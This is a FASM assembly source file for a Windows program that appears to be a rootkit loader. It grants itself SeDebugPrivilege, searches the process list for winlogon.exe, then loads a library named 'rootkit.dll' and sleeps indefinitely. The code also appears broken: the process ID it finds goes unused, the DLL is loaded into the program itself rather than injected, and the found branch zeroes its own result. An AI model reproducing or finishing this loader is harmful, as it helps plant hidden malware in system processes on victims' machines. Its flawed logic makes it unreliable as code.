format PE GUI 4.0

include 'win32a.inc'

section '.text' code readable writeable executable

procName db 'winlogon.exe', 0
PrivName db 'SeDebugPrivilege', 0
DllName  db 'rootkit.dll', 0

EnableDebugPrivilege:
  push	  ebp
  mov	  ebp, esp
  sub	  esp, 24h
  push	  esp
  push	  28h
  push	  -1
  call	  [OpenProcessToken]
  test	  eax, eax
  jz	  @F
  lea	  eax, [esp + 8]
  push	  eax
  push	  PrivName
  push	  0
  call	  [LookupPrivilegeValue]
  test	  eax, eax
  jz	  @F
  mov	  dword [esp + 14h], 1
  mov	  eax, [esp + 8]
  mov	  [esp + 18h], eax
  mov	  eax, [esp + 0Ch]
  mov	  [esp + 1Ch], eax
  mov	  dword [esp + 20h], 2
  lea	  eax, [esp + 10h]
  push	  eax
  lea	  eax, [esp + 18h]
  push	  eax
  push	  10h
  lea	  eax, [esp + 20h]
  push	  eax
  push	  0
  mov	  eax, [esp + 14h]
  push	  eax
  call	  [AdjustTokenPrivileges]
@@:
  leave
  ret

FindProcess:
   push   ebp
   mov	  ebp, esp
   sub	  esp, 13Ch
   mov	  dword [ebp-13Ch], 128h
   push   0
   push   2
   call   [CreateToolhelp32Snapshot]
   mov	  esi, eax
   cmp	  eax, -1
   jz	  @F
   lea	  eax, [ebp-13Ch]
   push   eax
   push   esi
   call   [Process32First]
   test   eax, eax
   jz	  @F
@@:
   lea	  eax, [ebp-118h]
   push   eax
   push   procName
   call   [lstrcmpi]
   test   eax, eax
   jz	  pFound
   lea	  eax, [ebp-13Ch]
   push   eax
   push   esi
   call   [Process32Next]
   test   eax, eax
   jz	  @F
   jmp	  @B
@@:
   xor	  eax, eax
   leave
   ret
pFound:
   mov	  eax, [ebp-308]
   jmp	  @B


entry $
  call	  EnableDebugPrivilege
  call	  FindProcess


  push	  DllName

  call	  [LoadLibrary]
  push	  -1
   call [Sleep]

  ret

section '.idata' import data readable writeable

  library kernel32, 'kernel32.dll', \
	  advapi32, 'advapi32.dll'

  import kernel32,		     \
       LoadLibrary,  'LoadLibraryA', \
       Sleep,	     'Sleep', \
       CreateToolhelp32Snapshot, 'CreateToolhelp32Snapshot', \
       Process32First, 'Process32First', \
       lstrcmpi, 'lstrcmpi', \
       Process32Next, 'Process32Next'



   import advapi32,					     \
       OpenProcessToken,	 'OpenProcessToken',	     \
       LookupPrivilegeValue,	 'LookupPrivilegeValueA',    \
       AdjustTokenPrivileges,	 'AdjustTokenPrivileges'